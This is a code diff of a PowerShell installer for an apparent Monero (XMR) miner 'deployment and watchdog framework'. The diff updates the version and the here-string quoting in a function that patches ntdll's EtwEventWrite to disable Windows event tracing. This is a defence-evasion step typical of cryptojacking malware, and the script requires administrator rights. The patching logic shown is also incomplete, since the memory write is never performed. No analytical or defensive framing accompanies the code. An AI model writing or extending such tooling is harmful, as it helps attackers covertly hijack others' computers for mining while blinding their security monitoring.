@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    XMR Miner Automated Deployment & Watchdog Framework v2.0 - Installer
+    XMR Miner Automated Deployment & Watchdog Framework v2.1 - Installer
 #>
 
 # Ensure Administrator Privileges
@@ -30,11 +30,11 @@ function Patch-Memory {
         @{ Module = "ntdll.dll"; Function = "EtwEventWrite"; Patch = [Byte[]](0xC3, 0x00) }
     )
     foreach ($m in $methods) {$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-            (Add-Type -MemberDefinition @"
+            (Add-Type -MemberDefinition @'
             [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
             [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
             [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-" -Name "Win32Patches" -Namespace Win32 -PassThru)::GetProcAddress(
+'@ -Name "Win32Patches" -Namespace Win32 -PassThru)::GetProcAddress(
                 [Win32.Win32Patches]::GetModuleHandle($m.Module),$m.Function), [Action])
     }
 }
